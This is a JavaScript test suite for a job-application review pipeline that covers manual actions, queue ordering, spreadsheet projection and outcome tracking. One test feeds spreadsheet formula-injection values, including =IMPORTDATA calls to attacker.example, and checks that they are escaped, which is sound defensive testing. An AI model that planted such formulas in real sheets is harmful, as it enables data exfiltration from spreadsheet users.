import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import test from "node:test";

import {
  applyManualAction as applyManualActionCore,
  buildFunnelSummary,
  buildReviewQueue,
  buildReviewQueueProjection,
  reasonForReview,
  reconcileReviewQueue,
  validateReviewQueueConfig,
  processReviewActions as processReviewActionsCore
} from "../src/review.mjs";
import { mergeOutcomeEvents, stateGuard } from "../src/contracts.mjs";

const loadJson = async (path) => JSON.parse(await readFile(new URL(path, import.meta.url), "utf8"));
const schema = await loadJson("../config/pipeline-schema.json");
const view = await loadJson("../config/review-sheet.json");
const profile = await loadJson("../config/candidate-profile.json");
const applicationPolicy = await loadJson(
  "../config/application-policy.json"
);
const packPolicy = await loadJson(
  "../config/application-pack-policy.json"
);
const messageSafetyContext = {
  profile,
  applicationPolicy,
  packPolicy
};
const now = "2026-07-28T10:00:00.000Z";
const applyManualAction = (record, usedSchema, at) =>
  applyManualActionCore(
    record,
    usedSchema,
    at,
    messageSafetyContext
  );
const processReviewActions = (
  activeRows,
  archiveRows,
  usedSchema,
  at,
  queueContext
) =>
  processReviewActionsCore(
    activeRows,
    archiveRows,
    usedSchema,
    at,
    messageSafetyContext,
    queueContext
  );

const job = (overrides = {}) => ({
  row_number: 2,
  source: "onlinejobs.ph",
  source_job_id: "6001",
  canonical_job_id: "onlinejobs.ph:6001",
  canonical_url: "https://onlinejobs.ph/jobseekers/job/example-6001",
  job_title: "TypeScript Developer",
  posted_at: "2026-07-27T10:00:00.000Z",
  pipeline_status: "ready",
  match_score: 75,
  qualification_score: 82,
  opportunity_score: 78,
  ranking_confidence: "medium",
  apply_points_recommendation: "normal_allocation",
  scoring_policy_version: "2026-07-28/v1",
  match_tier: "direct",
  match_reasons: ["Matched skill: TypeScript"],
  requirement_gaps: [],
  generated_message: "Copy-ready message",
  message_profile_version: profile.profile_version,
  message_policy_version: applicationPolicy.policy_version,
  message_validation_status: "valid",
  application_instructions: [],
  screening_questions: [],
  selected_proof_refs: [
    "experience:upwork",
    "projects:job-pipeline"
  ],
  application_warnings: [],
  application_pack_status: "ready",
  application_pack_version: packPolicy.pack_version,
  application_pack_profile_version: profile.profile_version,
  application_pack_policy_version: packPolicy.policy_version,
  application_pack_generated_at: now,
  outcome_events: [],
  application_decision: "",
  outcome: "",
  manual_action: "",
  ...overrides
});

test("review configuration exposes required information and controlled actions", () => {
  assert.deepEqual(validateReviewQueueConfig(view, schema), []);
  assert.equal(view.review_queue.sheet, "Review Queue");
  assert.deepEqual(view.review_queue.visible_columns, [
    "Status",
    "Job title",
    "Company",
    "Score",
    "Reason for review",
    "Generated message",
    "Job link",
    "Action"
  ]);
  assert.deepEqual(view.review_queue.hidden_columns, [
    "canonical_job_id",
    "source_state_guard"
  ]);
  assert.deepEqual(view.review_queue.actions, {
    "Generate Application": "promote",
    "I Applied": "mark_applied",
    Skip: "mark_skipped"
  });
  for (const field of [
    "job_title",
    "company",
    "canonical_url",
    "posted_at",
    "salary_text",
    "qualification_score",
    "opportunity_score",
    "ranking_confidence",
    "apply_points_recommendation",
    "application_pack_status",
    "application_instructions",
    "screening_questions",
    "selected_proof_refs",
    "application_warnings",
    "match_score",
    "match_tier",
    "match_reasons",
    "requirement_gaps",
    "pipeline_status",
    "generated_message",
    "manual_action",
    "application_decision",
    "outcome"
  ]) {
    assert.ok(view.review_columns.includes(field), `missing review column ${field}`);
  }
  assert.deepEqual(view.editable_columns, [
    "apply_points_input",
    "application_message_strategy_input",
    "manual_action",
    "notes"
  ]);
  assert.deepEqual(view.hidden_columns, [
    "state_guard",
    "processing_commit_guard",
    "processing_token"
  ]);
  assert.ok(view.manual_action_dropdown.includes("promote"));
  assert.ok(view.manual_action_dropdown.includes("mark_reviewed"));
  assert.ok(view.manual_action_dropdown.includes("mark_applied"));
  assert.ok(view.manual_action_dropdown.includes("outcome_offer"));
});

test("first instrumented review is explicit and preserves its original timestamp", () => {
  const untouched = applyManualAction(job(), schema, now);
  assert.equal(untouched.record.first_reviewed_at, undefined);

  const first = applyManualAction(
    job({ manual_action: "mark_reviewed" }),
    schema,
    now
  );
  assert.equal(first.valid, true);
  assert.equal(first.record.first_reviewed_at, now);

  const repeatedAt = "2026-07-28T11:00:00.000Z";
  const repeated = applyManualAction(
    { ...first.record, manual_action: "mark_reviewed" },
    schema,
    repeatedAt
  );
  assert.equal(repeated.valid, true);
  assert.equal(repeated.record.first_reviewed_at, now);
  assert.equal(repeated.record.manual_action, "");
});

test("manual promotion and regeneration create one valid generation path", () => {
  const promoted = applyManualAction(
    job({ pipeline_status: "review_required", manual_action: "promote", generated_message: "" }),
    schema,
    now
  );
  assert.equal(promoted.valid, true);
  assert.equal(promoted.record.pipeline_status, "recommended");
  assert.equal(promoted.record.manual_action, "");

  const regenerated = applyManualAction(job({ manual_action: "regenerate" }), schema, now);
  assert.equal(regenerated.valid, true);
  assert.equal(regenerated.record.pipeline_status, "recommended");
  assert.equal(regenerated.record.generated_message, "Copy-ready message");
});

test("ready jobs can be applied or skipped only by an explicit action", () => {
  const unchanged = applyManualAction(job(), schema, now);
  assert.equal(unchanged.changed, false);
  assert.equal(unchanged.record.application_decision, "");

  const applied = applyManualAction(job({ manual_action: "mark_applied" }), schema, now);
  assert.equal(applied.record.pipeline_status, "applied");
  assert.equal(applied.record.application_decision, "applied");
  assert.equal(applied.record.application_decided_at, now);
  assert.equal(applied.record.first_reviewed_at, now);

  const skipped = applyManualAction(job({ manual_action: "mark_skipped" }), schema, now);
  assert.equal(skipped.record.pipeline_status, "skipped");
  assert.equal(skipped.record.application_decision, "skipped");
});

test("mark applied validates controlled inputs and freezes application context", () => {
  const source = job({
    apply_points_input: "10",
    application_message_strategy_input: "instruction-aware/v1",
    manual_action: "mark_applied"
  });
  const applied = applyManualAction(source, schema, now);
  assert.equal(applied.valid, true);
  assert.equal(applied.record.apply_points_used, 10);
  assert.equal(
    applied.record.application_message_strategy,
    "instruction-aware/v1"
  );
  assert.equal(applied.record.application_qualification_score, 82);
  assert.equal(applied.record.application_opportunity_score, 78);
  assert.equal(applied.record.application_ranking_confidence, "medium");
  assert.equal(
    applied.record.application_scoring_policy_version,
    "2026-07-28/v1"
  );
  assert.equal(
    applied.record.application_apply_points_recommendation,
    "normal_allocation"
  );
  assert.equal(applied.record.application_pack_status_at_apply, "ready");
  assert.equal(applied.record.application_posting_age_days, 1);
  assert.equal(applied.record.application_snapshot_at, now);
  assert.equal(applied.record.apply_points_input, "");
  assert.equal(applied.record.application_message_strategy_input, "");

  const later = applyManualAction(
    {
      ...applied.record,
      pipeline_status: "ready",
      application_decision: "",
      qualification_score: 30,
      opportunity_score: 20,
      application_pack_status: "ready",
      manual_action: "mark_applied"
    },
    schema,
    "2026-07-29T10:00:00.000Z"
  );
  assert.equal(later.valid, true);
  assert.equal(later.record.application_qualification_score, 82);
  assert.equal(later.record.application_opportunity_score, 78);
  assert.equal(later.record.application_pack_status_at_apply, "ready");
  assert.equal(later.record.application_snapshot_at, now);
});

test("mark applied rejects quarantined persisted content without mutating decision state", () => {
  const unsafe = job({
    generated_message:
      "I have a strong foundation. Resume: https://johnlesterescarlan.netlify.app/john_lester_escarlan_resume.pdf",
    message_profile_version: "legacy/unknown",
    message_policy_version: "",
    message_validation_status: "",
    application_pack_status: "",
    application_pack_version: "",
    application_pack_profile_version: "",
    application_pack_policy_version: "",
    application_pack_generated_at: "",
    manual_action: "mark_applied"
  });
  const snapshot = structuredClone(unsafe);
  const denied = applyManualAction(unsafe, schema, now);
  assert.equal(denied.valid, false);
  assert.equal(denied.changed, false);
  assert.match(denied.error, /^message_quarantined:/);
  assert.deepEqual(denied.record, snapshot);
  assert.equal(denied.record.application_decision, "");
  assert.equal(denied.record.application_decided_at, undefined);
  assert.equal(denied.record.application_snapshot_at, undefined);
});

test("unknown points stay unknown and invalid application input is atomic", () => {
  const unknown = applyManualAction(
    job({ manual_action: "mark_applied" }),
    schema,
    now
  );
  assert.equal(unknown.valid, true);
  assert.equal(unknown.record.apply_points_used, "");

  for (const invalidPoints of [0, 61, 1.5, "not-a-number"]) {
    const original = job({
      apply_points_input: invalidPoints,
      manual_action: "mark_applied"
    });
    const result = applyManualAction(original, schema, now);
    assert.equal(result.valid, false);
    assert.deepEqual(result.record, original);
    assert.match(result.error, /integer from 1 to 60/);
  }

  const maliciousStrategy = job({
    apply_points_input: 5,
    application_message_strategy_input: "token=secret value",
    manual_action: "mark_applied"
  });
  const invalidStrategy = applyManualAction(maliciousStrategy, schema, now);
  assert.equal(invalidStrategy.valid, false);
  assert.deepEqual(invalidStrategy.record, maliciousStrategy);
  assert.doesNotMatch(invalidStrategy.error, /secret/);
});

test("duplicate application decisions preserve their original timestamp and snapshot", () => {
  const applied = applyManualAction(
    job({
      apply_points_input: 8,
      application_message_strategy_input: "instruction-aware/v1",
      manual_action: "mark_applied"
    }),
    schema,
    now
  ).record;
  const repeated = applyManualAction(
    {
      ...applied,
      apply_points_input: 60,
      application_message_strategy_input: "manual-custom/v2",
      manual_action: "mark_applied"
    },
    schema,
    "2026-07-29T10:00:00.000Z"
  );
  assert.equal(repeated.valid, true);
  assert.equal(repeated.record.application_decided_at, now);
  assert.equal(repeated.record.application_snapshot_at, now);
  assert.equal(repeated.record.apply_points_used, 8);
  assert.equal(
    repeated.record.application_message_strategy,
    "instruction-aware/v1"
  );
  assert.equal(repeated.record.apply_points_input, "");

  const skipped = applyManualAction(
    job({ manual_action: "mark_skipped" }),
    schema,
    now
  ).record;
  const skippedAgain = applyManualAction(
    { ...skipped, manual_action: "mark_skipped" },
    schema,
    "2026-07-29T10:00:00.000Z"
  );
  assert.equal(skippedAgain.record.application_decided_at, now);
});

test("outcomes require an applied decision and preserve application history", () => {
  const applied = job({
    pipeline_status: "archived",
    archived_from_status: "applied",
    application_decision: "applied",
    application_decided_at: "2026-07-27T10:00:00.000Z",
    manual_action: "outcome_interview"
  });
  const result = applyManualAction(applied, schema, now);
  assert.equal(result.valid, true);
  assert.equal(result.record.outcome, "interview");
  assert.equal(result.record.outcome_at, now);
  assert.equal(result.record.application_decision, "applied");
  assert.equal(result.record.application_decided_at, applied.application_decided_at);
  assert.equal(result.record.generated_message, applied.generated_message);
  assert.deepEqual(
    result.record.outcome_events.map((event) => event.type),
    ["interview"]
  );

  const invalid = applyManualAction(
    job({ application_decision: "skipped", manual_action: "outcome_offer" }),
    schema,
    now
  );
  assert.equal(invalid.valid, false);
  assert.equal(invalid.record.outcome, "");
});

test("progressive outcomes and corrections preserve cumulative audit evidence", () => {
  const applied = job({
    pipeline_status: "archived",
    archived_from_status: "applied",
    application_decision: "applied",
    application_decided_at: "2026-07-27T10:00:00.000Z"
  });
  const replied = applyManualAction(
    { ...applied, manual_action: "outcome_replied" },
    schema,
    "2026-07-28T10:00:00.000Z"
  ).record;
  const repeatedReply = applyManualAction(
    { ...replied, manual_action: "outcome_replied" },
    schema,
    "2026-07-28T11:00:00.000Z"
  ).record;
  assert.equal(repeatedReply.outcome_events.length, 1);
  assert.equal(repeatedReply.outcome_at, "2026-07-28T10:00:00.000Z");
  const interviewed = applyManualAction(
    { ...repeatedReply, manual_action: "outcome_interview" },
    schema,
    "2026-07-29T10:00:00.000Z"
  ).record;
  const rejected = applyManualAction(
    { ...interviewed, manual_action: "outcome_rejected" },
    schema,
    "2026-07-30T10:00:00.000Z"
  ).record;
  assert.equal(rejected.outcome, "rejected");
  assert.deepEqual(
    rejected.outcome_events.map((event) => event.type),
    ["replied", "interview", "rejected"]
  );

  const cleared = applyManualAction(
    { ...rejected, manual_action: "clear_outcome" },
    schema,
    "2026-07-31T10:00:00.000Z"
  ).record;
  assert.equal(cleared.outcome, "");
  assert.deepEqual(
    cleared.outcome_events.map((event) => event.type),
    ["replied", "interview", "rejected", "correction"]
  );
  assert.equal(cleared.outcome_events.at(-1).previous_outcome, "rejected");

  const repeated = applyManualAction(
    { ...cleared, manual_action: "clear_outcome" },
    schema,
    "2026-08-01T10:00:00.000Z"
  ).record;
  assert.equal(repeated.outcome_events.length, 4);
  assert.equal(repeated.outcome_at, cleared.outcome_at);
});

test("concurrent outcome histories merge without losing distinct milestones", () => {
  const base = job({
    pipeline_status: "archived",
    archived_from_status: "applied",
    application_decision: "applied"
  });
  const replied = applyManualAction(
    { ...base, manual_action: "outcome_replied" },
    schema,
    "2026-07-28T10:00:00.000Z"
  ).record;
  const interviewed = applyManualAction(
    { ...base, manual_action: "outcome_interview" },
    schema,
    "2026-07-28T10:00:01.000Z"
  ).record;
  const merged = mergeOutcomeEvents(
    replied.outcome_events,
    interviewed.outcome_events,
    replied.outcome_events
  );
  assert.deepEqual(
    merged.map((event) => event.type),
    ["replied", "interview"]
  );
});

test("a manual decision changes the guard and invalidates a stale automated claim", () => {
  const original = job({
    processing_stage: "generation",
    processing_token: "stale-token",
    processing_commit_guard: "commit:stale-token",
    processing_started_at: "2026-07-28T09:59:00.000Z"
  });
  original.state_guard = stateGuard(original);
  const applied = applyManualAction(
    { ...original, manual_action: "mark_applied" },
    schema,
    now
  ).record;
  assert.notEqual(applied.state_guard, original.state_guard);
  assert.equal(applied.processing_token, "");
  assert.equal(applied.processing_commit_guard, "");
  assert.equal(applied.processing_stage, "");
});

test("unsupported and invalid actions do not erase the previous record", () => {
  const original = job({ manual_action: "delete_everything", outcome: "replied" });
  const unsupported = applyManualAction(original, schema, now);
  assert.equal(unsupported.valid, false);
  assert.deepEqual(unsupported.record, original);

  const invalidTransition = applyManualAction(
    job({ pipeline_status: "review_required", manual_action: "mark_applied" }),
    schema,
    now
  );
  assert.equal(invalidTransition.valid, false);
  assert.equal(invalidTransition.record.pipeline_status, "review_required");

  const invalidInput = processReviewActions(
    [
      job({
        apply_points_input: 99,
        application_message_strategy_input: "token=do-not-log",
        manual_action: "mark_applied"
      })
    ],
    [],
    schema,
    now
  );
  assert.deepEqual(invalidInput.active_updates, []);
  assert.equal(invalidInput.invalid_actions.length, 1);
  assert.doesNotMatch(JSON.stringify(invalidInput.invalid_actions), /do-not-log/);

  const malformedHistory = job({
    pipeline_status: "archived",
    archived_from_status: "applied",
    application_decision: "applied",
    outcome_events: "not-json",
    manual_action: "outcome_replied"
  });
  const malformed = applyManualAction(malformedHistory, schema, now);
  assert.equal(malformed.valid, false);
  assert.deepEqual(malformed.record, malformedHistory);
});

test("active and archived action processing stay in their ownership boundary", () => {
  const processed = processReviewActions(
    [job({ manual_action: "mark_applied" })],
    [
      job({
        row_number: 10,
        pipeline_status: "archived",
        archived_from_status: "applied",
        application_decision: "applied",
        manual_action: "outcome_replied"
      })
    ],
    schema,
    now
  );
  assert.equal(processed.active_updates.length, 1);
  assert.equal(processed.archive_updates.length, 1);
  assert.equal(processed.archive_updates[0].outcome, "replied");
  assert.deepEqual(processed.invalid_actions, []);
});

test("priority queue orders ready and high-match jobs before review and recovery", () => {
  const rows = [
    job({ source_job_id: "6101", canonical_job_id: "onlinejobs.ph:6101", pipeline_status: "review_required", match_score: 50 }),
    job({ source_job_id: "6102", canonical_job_id: "onlinejobs.ph:6102", pipeline_status: "ready", match_score: 60 }),
    job({ source_job_id: "6103", canonical_job_id: "onlinejobs.ph:6103", pipeline_status: "recommended", match_score: 90 }),
    job({ source_job_id: "6104", canonical_job_id: "onlinejobs.ph:6104", pipeline_status: "retryable_error", match_score: 95 })
  ];
  const queue = buildReviewQueue(rows, schema, now);
  assert.deepEqual(queue.map((record) => record.pipeline_status), [
    "ready",
    "recommended",
    "review_required",
    "retryable_error"
  ]);
});

test("priority queue uses opportunity score within lifecycle state and deterministic fallback", () => {
  const rows = [
    job({
      source_job_id: "6111",
      canonical_job_id: "onlinejobs.ph:6111",
      pipeline_status: "recommended",
      opportunity_score: 70,
      match_score: 10,
      ranking_confidence: "medium",
      posted_at: "2026-07-28T08:00:00.000Z"
    }),
    job({
      source_job_id: "6112",
      canonical_job_id: "onlinejobs.ph:6112",
      pipeline_status: "recommended",
      opportunity_score: 60,
      match_score: 99,
      ranking_confidence: "high",
      posted_at: "2026-07-28T09:00:00.000Z"
    }),
    job({
      source_job_id: "6113",
      canonical_job_id: "onlinejobs.ph:6113",
      pipeline_status: "recommended",
      opportunity_score: "",
      match_score: 65,
      posted_at: "2026-07-28T10:00:00.000Z"
    }),
    job({
      source_job_id: "6115",
      canonical_job_id: "onlinejobs.ph:6115",
      pipeline_status: "recommended",
      opportunity_score: 60,
      match_score: 1,
      ranking_confidence: "high",
      posted_at: "2026-07-28T09:00:00.000Z"
    }),
    job({
      source_job_id: "6114",
      canonical_job_id: "onlinejobs.ph:6114",
      pipeline_status: "recommended",
      opportunity_score: 60,
      match_score: 1,
      ranking_confidence: "high",
      posted_at: "2026-07-28T09:00:00.000Z"
    })
  ];
  assert.deepEqual(
    buildReviewQueue(rows, schema, now).map((record) => record.canonical_job_id),
    [
      "onlinejobs.ph:6111",
      "onlinejobs.ph:6113",
      "onlinejobs.ph:6112",
      "onlinejobs.ph:6114",
      "onlinejobs.ph:6115"
    ]
  );
});

test("simplified queue projects exact review fields, reasons, eligibility, and legacy scores", () => {
  const reviewRequired = job({
    source_job_id: "6121",
    canonical_job_id: "onlinejobs.ph:6121",
    pipeline_status: "review_required",
    opportunity_score: 55,
    requirement_gap_details: [
      { requirement: "Confirm Kubernetes depth", classification: "ambiguous" }
    ],
    application_warnings: ["Verify required availability"]
  });
  const ready = job({
    source_job_id: "6122",
    canonical_job_id: "onlinejobs.ph:6122",
    opportunity_score: 80
  });
  const legacy = job({
    source_job_id: "6123",
    canonical_job_id: "onlinejobs.ph:6123",
    pipeline_status: "recommended",
    opportunity_score: "",
    match_score: 64
  });
  const excluded = [
    job({
      source_job_id: "6124",
      canonical_job_id: "onlinejobs.ph:6124",
      pipeline_status: "retryable_error"
    }),
    job({
      source_job_id: "6125",
      canonical_job_id: "onlinejobs.ph:6125",
      pipeline_status: "applied",
      application_decision: "applied"
    })
  ];
  const projection = buildReviewQueueProjection(
    [reviewRequired, ready, legacy, ...excluded],
    schema,
    view,
    now
  );
  assert.deepEqual(
    projection.rows.map((row) => row.canonical_job_id),
    [
      "onlinejobs.ph:6122",
      "onlinejobs.ph:6123",
      "onlinejobs.ph:6121"
    ]
  );
  assert.deepEqual(Object.keys(projection.rows[0]), view.review_queue.fields);
  assert.equal(projection.rows[0].Score, 80);
  assert.equal(projection.rows[1].Score, 64);
  assert.equal(projection.rows[0].Action, "");
  assert.equal(
    projection.rows[0].source_state_guard,
    stateGuard(ready)
  );
  assert.match(
    projection.rows[2]["Reason for review"],
    /Verify required availability/
  );
  assert.match(
    projection.rows[2]["Reason for review"],
    /Confirm Kubernetes depth/
  );
  assert.equal(projection.invalid_records.length, 0);

  const formulaLike = buildReviewQueueProjection(
    [
      job({
        source_job_id: "6126",
        canonical_job_id: "onlinejobs.ph:6126",
        job_title: "=IMPORTDATA(\"https://attacker.example/title\")",
        company: "+malicious",
        generated_message: "@malicious"
      })
    ],
    schema,
    view,
    now
  ).rows[0];
  assert.match(formulaLike["Job title"], /^'=/);
  assert.match(formulaLike.Company, /^'\+/);
  assert.match(formulaLike["Generated message"], /^'@/);

  assert.equal(
    reasonForReview(
      job({
        pipeline_status: "review_required",
        match_reasons: [],
        requirement_gaps: [],
        requirement_gap_details: [],
        application_warnings: []
      }),
      view
    ),
    "Review required; no review reason was recorded."
  );
  assert.match(
    reasonForReview(
      job({
        pipeline_status: "review_required",
        application_warnings: ["=IMPORTDATA(\"https://attacker.example\")"]
      }),
      view
    ),
    /Warnings: '=IMPORTDATA/
  );
});

test("simplified queue excludes ambiguous source identities instead of projecting duplicates", () => {
  const duplicate = job({
    source_job_id: "6131",
    canonical_job_id: "onlinejobs.ph:6131",
    pipeline_status: "ready"
  });
  const projection = buildReviewQueueProjection(
    [
      duplicate,
      { ...duplicate, row_number: 9, job_title: "Conflicting duplicate" },
      job({
        source: "",
        source_job_id: "",
        canonical_job_id: "",
        canonical_url: "",
        job_title: "Missing identity",
        pipeline_status: "review_required"
      })
    ],
    schema,
    view,
    now
  );
  assert.deepEqual(projection.rows, []);
  assert.deepEqual(
    projection.invalid_records.map((entry) => entry.error).sort(),
    [
      "eligible review record has duplicate canonical identity",
      "eligible review record has duplicate canonical identity",
      "eligible review record is missing canonical identity"
    ]
  );
});

test("friendly queue actions reuse guarded manual transitions by canonical identity", () => {
  const cases = [
    ["Generate Application", "review_required", "recommended"],
    ["I Applied", "ready", "applied"],
    ["Skip", "ready", "skipped"]
  ];
  for (const [label, initialStatus, expectedStatus] of cases) {
    const source = job({
      row_number: 42,
      source_job_id: `620-${label.length}`,
      canonical_job_id: `onlinejobs.ph:620-${label.length}`,
      pipeline_status: initialStatus
    });
    source.state_guard = stateGuard(source);
    const processed = processReviewActions(
      [source],
      [],
      schema,
      now,
      {
        executionId: "review-execution-1",
        reviewConfig: view,
        queueRows: [
          {
            row_number: 99,
            Action: label,
            canonical_job_id: source.canonical_job_id,
            source_state_guard: source.state_guard
          }
        ]
      }
    );
    assert.equal(processed.active_claims.length, 1);
    assert.equal(processed.active_claims[0].state_guard, source.state_guard);
    assert.match(
      processed.active_claims[0].processing_commit_guard,
      /^commit:review:/
    );
    assert.equal(processed.active_updates.length, 1);
    assert.equal(processed.active_updates[0].row_number, 42);
    assert.equal(processed.active_updates[0].pipeline_status, expectedStatus);
    assert.equal(processed.active_updates[0].manual_action, "");
    assert.equal(processed.processed_queue_actions.length, 1);
    assert.deepEqual(processed.invalid_actions, []);
  }
});

test("duplicate, stale, missing, and conflicting queue actions fail closed", () => {
  const source = job({
    source_job_id: "6141",
    canonical_job_id: "onlinejobs.ph:6141"
  });
  source.state_guard = stateGuard(source);
  const stale = processReviewActions(
    [source],
    [],
    schema,
    now,
    {
      executionId: "review-stale",
      reviewConfig: view,
      queueRows: [
        {
          row_number: 3,
          Action: "I Applied",
          canonical_job_id: source.canonical_job_id,
          source_state_guard: "stale-guard"
        }
      ]
    }
  );
  assert.deepEqual(stale.active_updates, []);
  assert.match(stale.invalid_actions[0].error, /stale/);

  const conflicting = processReviewActions(
    [source],
    [],
    schema,
    now,
    {
      executionId: "review-conflict",
      reviewConfig: view,
      queueRows: [
        {
          row_number: 3,
          Action: "I Applied",
          canonical_job_id: source.canonical_job_id,
          source_state_guard: source.state_guard
        },
        {
          row_number: 4,
          Action: "Skip",
          canonical_job_id: source.canonical_job_id,
          source_state_guard: source.state_guard
        }
      ]
    }
  );
  assert.deepEqual(conflicting.active_updates, []);
  assert.equal(conflicting.invalid_actions.length, 2);
  assert.ok(
    conflicting.invalid_actions.every((entry) =>
      /conflicting review queue actions/.test(entry.error)
    )
  );

  const missing = processReviewActions(
    [source],
    [],
    schema,
    now,
    {
      executionId: "review-missing",
      reviewConfig: view,
      queueRows: [
        {
          row_number: 8,
          Action: "Skip",
          canonical_job_id: "onlinejobs.ph:missing",
          source_state_guard: source.state_guard
        }
      ]
    }
  );
  assert.deepEqual(missing.active_updates, []);
  assert.match(missing.invalid_actions[0].error, /source record is missing/);

  const duplicateSource = processReviewActions(
    [source, { ...source, row_number: 10 }],
    [],
    schema,
    now,
    {
      executionId: "review-duplicate-source",
      reviewConfig: view,
      queueRows: [
        {
          row_number: 11,
          Action: "Skip",
          canonical_job_id: source.canonical_job_id,
          source_state_guard: source.state_guard
        }
      ]
    }
  );
  assert.deepEqual(duplicateSource.active_updates, []);
  assert.equal(duplicateSource.invalid_actions.length, 1);
  assert.match(duplicateSource.invalid_actions[0].error, /duplicate source/);
});

test("identical queue deliveries coalesce while a conflicting Sheet1 action wins", () => {
  const source = job({
    source_job_id: "6151",
    canonical_job_id: "onlinejobs.ph:6151"
  });
  source.state_guard = stateGuard(source);
  const duplicate = processReviewActions(
    [source],
    [],
    schema,
    now,
    {
      executionId: "review-duplicate-delivery",
      reviewConfig: view,
      queueRows: [3, 4].map((rowNumber) => ({
        row_number: rowNumber,
        Action: "I Applied",
        canonical_job_id: source.canonical_job_id,
        source_state_guard: source.state_guard
      }))
    }
  );
  assert.equal(duplicate.active_updates.length, 1);
  assert.equal(duplicate.processed_queue_actions[0].duplicate_count, 2);

  const directWins = processReviewActions(
    [{ ...source, manual_action: "mark_skipped" }],
    [],
    schema,
    now,
    {
      executionId: "review-direct-wins",
      reviewConfig: view,
      queueRows: [
        {
          row_number: 3,
          Action: "I Applied",
          canonical_job_id: source.canonical_job_id,
          source_state_guard: source.state_guard
        }
      ]
    }
  );
  assert.equal(directWins.active_updates.length, 1);
  assert.equal(directWins.active_updates[0].pipeline_status, "skipped");
  assert.equal(directWins.invalid_actions.length, 1);
  assert.match(directWins.invalid_actions[0].error, /conflicts with Sheet1/);
});

test("queue reconciliation removes completed rows, refreshes promotion, and protects new edits", () => {
  const ready = job({
    source_job_id: "6161",
    canonical_job_id: "onlinejobs.ph:6161"
  });
  ready.state_guard = stateGuard(ready);
  const recommended = job({
    source_job_id: "6162",
    canonical_job_id: "onlinejobs.ph:6162",
    pipeline_status: "recommended"
  });
  recommended.state_guard = stateGuard(recommended);
  const applied = {
    ...ready,
    pipeline_status: "applied",
    application_decision: "applied"
  };
  applied.state_guard = stateGuard(applied);
  const initialQueue = [
    {
      row_number: 2,
      Action: "I Applied",
      canonical_job_id: ready.canonical_job_id,
      source_state_guard: ready.state_guard
    },
    {
      row_number: 3,
      Action: "",
      canonical_job_id: recommended.canonical_job_id,
      source_state_guard: recommended.state_guard
    }
  ];
  const currentQueue = [
    initialQueue[0],
    {
      ...initialQueue[1],
      Action: "Skip"
    },
    {
      row_number: 7,
      Action: "",
      canonical_job_id: "onlinejobs.ph:stale",
      source_state_guard: "stale"
    }
  ];
  const reconciled = reconcileReviewQueue(
    [applied, recommended],
    currentQueue,
    initialQueue,
    schema,
    view,
    now
  );
  assert.deepEqual(reconciled.delete_rows, [
    { row_number: 7 },
    { row_number: 2 }
  ]);
  assert.equal(reconciled.protected_action_count, 1);
  assert.deepEqual(reconciled.queue_rows, []);

  const refreshed = reconcileReviewQueue(
    [recommended],
    [initialQueue[1]],
    [initialQueue[1]],
    schema,
    view,
    now
  );
  assert.deepEqual(refreshed.delete_rows, [{ row_number: 3 }]);
  assert.equal(refreshed.queue_rows.length, 1);
  assert.equal(refreshed.queue_rows[0].Status, "recommended");
  assert.equal(refreshed.queue_rows[0].Action, "");
});

test("queue reconciliation retains an action until its guarded source write is confirmed", () => {
  const ready = job({
    source_job_id: "6171",
    canonical_job_id: "onlinejobs.ph:6171"
  });
  ready.state_guard = stateGuard(ready);
  const pending = {
    row_number: 2,
    Action: "I Applied",
    canonical_job_id: ready.canonical_job_id,
    source_state_guard: ready.state_guard
  };
  const unconfirmed = reconcileReviewQueue(
    [ready],
    [pending],
    [pending],
    schema,
    view,
    now
  );
  assert.deepEqual(unconfirmed.delete_rows, []);
  assert.deepEqual(unconfirmed.queue_rows, []);
  assert.equal(unconfirmed.protected_action_count, 1);

  const committed = {
    ...ready,
    pipeline_status: "applied",
    application_decision: "applied",
    application_decided_at: now
  };
  committed.state_guard = stateGuard(committed);
  const cleanupRetry = reconcileReviewQueue(
    [committed],
    [pending],
    [pending],
    schema,
    view,
    now
  );
  assert.deepEqual(cleanupRetry.delete_rows, [{ row_number: 2 }]);
  assert.deepEqual(cleanupRetry.queue_rows, []);
  assert.equal(cleanupRetry.protected_action_count, 0);
});

test("funnel summary deduplicates active/archive and never infers outcomes", () => {
  const activeRows = [
    job({ source_job_id: "6201", canonical_job_id: "onlinejobs.ph:6201", pipeline_status: "ready" }),
    job({ source_job_id: "6202", canonical_job_id: "onlinejobs.ph:6202", pipeline_status: "review_required", generated_message: "" })
  ];
  const archiveRows = [
    job({
      row_number: 10,
      source_job_id: "6203",
      canonical_job_id: "onlinejobs.ph:6203",
      pipeline_status: "archived",
      archived_from_status: "applied",
      application_decision: "applied",
      outcome: ""
    }),
    job({
      row_number: 11,
      source_job_id: "6204",
      canonical_job_id: "onlinejobs.ph:6204",
      pipeline_status: "archived",
      archived_from_status: "applied",
      application_decision: "applied",
      outcome: "offer"
    })
  ];
  const summary = buildFunnelSummary(activeRows, archiveRows, schema, now);
  assert.equal(summary.total_unique_jobs, 4);
  assert.equal(summary.ready, 3);
  assert.equal(summary.applied, 2);
  assert.equal(summary.offer, 1);
  assert.equal(summary.replied, 0);
  assert.equal(summary.interview, 0);
});

test("empty review and funnel states contain no placeholder records", () => {
  assert.deepEqual(buildReviewQueue([], schema, now), []);
  assert.deepEqual(buildFunnelSummary([], [], schema, now), {
    metric_key: "current",
    generated_at: now,
    total_unique_jobs: 0,
    discovered: 0,
    recommended: 0,
    review_required: 0,
    ready: 0,
    applied: 0,
    skipped: 0,
    replied: 0,
    interview: 0,
    offer: 0,
    rejected: 0,
    retryable_error: 0,
    terminal_error: 0,
    unavailable: 0
  });
});
